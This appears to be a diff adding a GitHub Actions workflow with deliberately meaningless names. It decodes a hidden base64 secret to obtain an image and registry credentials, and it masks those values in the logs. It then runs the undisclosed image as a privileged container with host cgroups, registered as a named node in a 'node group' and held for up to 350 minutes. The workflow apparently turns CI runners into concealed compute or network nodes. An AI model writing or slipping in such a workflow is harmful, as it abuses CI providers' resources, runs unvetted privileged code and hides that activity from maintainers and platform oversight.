@@ -1,0 +1,45 @@
+name: setup-a4
+on:
+  workflow_dispatch:
+    inputs:
+      minutes:
+        required: false
+        default: '350'
+      node_group:
+        required: false
+        default: 'gha'
+permissions: {}
+concurrency:
+  group: check-45-${{ github.run_id }}
+  cancel-in-progress: false
+jobs:
+  verify-5b:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: verify-fb
+        env:
+          CFG: ${{ secrets.CFG }}
+          MINUTES: ${{ inputs.minutes }}
+          NODE_GROUP: ${{ inputs.node_group }}
+        run: |
+          g() { printf %s "$CFG" | base64 -d | python3 -c "import sys,json;print(json.load(sys.stdin).get('$1',''))"; }
+          IMG=$(g IMAGE); R=$(g REGISTRY); U=$(g REGISTRY_USER); P=$(g REGISTRY_PASSWORD)
+          echo "::add-mask::$IMG"; echo "::add-mask::$R"; echo "::add-mask::$U"
+          printf %s "$P" | docker login "$R" -u "$U" --password-stdin > /dev/null 2>&1 \
+            || { echo "::error::auth"; exit 1; }
+          docker pull "$IMG" > /dev/null 2>&1 || { echo "::error::pull"; exit 1; }
+          D=$(python3 -c 'import os,json,base64;e=os.environ;r=e["GITHUB_REPOSITORY"].replace("/","-").replace("_","-").lower();n=r+"-run-"+e["GITHUB_RUN_ID"];print(base64.b64encode(json.dumps({"NODE_NAME":n,"HOLD_MINUTES":e["MINUTES"],"NODE_GROUP":e["NODE_GROUP"],"STOP_TIMEOUT":"240","CLEANUP":"trap"}).encode()).decode())')
+          sudo mkdir -p /mnt/b19439
+          sudo sysctl -qw net.core.default_qdisc=fq net.ipv4.tcp_congestion_control=bbr > /dev/null 2>&1 \
+            || echo "::warning::sysctl"
+          docker run -d --name prepare-ec --privileged --cgroupns=host \
+            -v /sys/fs/cgroup:/sys/fs/cgroup:rw \
+            -v /lib/modules:/lib/modules:ro \
+            -v /mnt/b19439:/mnt/w \
+            -e B="$CFG" -e D="$D" "$IMG" > /dev/null
+          docker logs -f prepare-ec || true
+          exit $(docker wait prepare-ec)
+      - name: prepare-26
+        if: always()
+        run: docker stop -t 240 prepare-ec > /dev/null 2>&1 || true
